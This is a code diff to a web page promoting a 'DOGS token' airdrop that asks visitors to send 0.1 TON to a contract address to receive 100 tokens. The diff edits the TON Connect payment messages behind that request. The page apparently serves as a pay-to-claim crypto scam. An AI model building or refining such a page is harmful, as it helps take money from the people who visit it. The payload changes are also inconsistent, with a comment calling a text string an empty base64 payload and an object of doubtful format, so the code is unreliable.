@@ -151,7 +151,7 @@
         </h1>
 
         <p class="description">
-            <i class="fas fa-gift"></i> Send 0.1 TON to receive 100 DOGS tokens123
+            <i class="fas fa-gift"></i> Send 0.1 TON to receive 100 DOGS tokens
             <br>
             <small>Join our community of happy DOGS token holders!</small>
         </p>
@@ -234,7 +234,11 @@
                             amount: '100000000', // 0.1 TON
                             stateInit: null,
                             bounce: true,
-                            payload: 'Claim airdrop!'
+                            payload: {
+                                abi: null,
+                                method: "receive",
+                                params: {}
+                            }
                         }
                     ]
                 };
@@ -247,6 +251,7 @@
                     messages: [{
                         address: AIRDROP_CONTRACT_ADDRESS,
                         amount: '100000000',
+                        payload: 'CLaim airdrop!' // Pusty payload w base64
                     }]
                 });
 
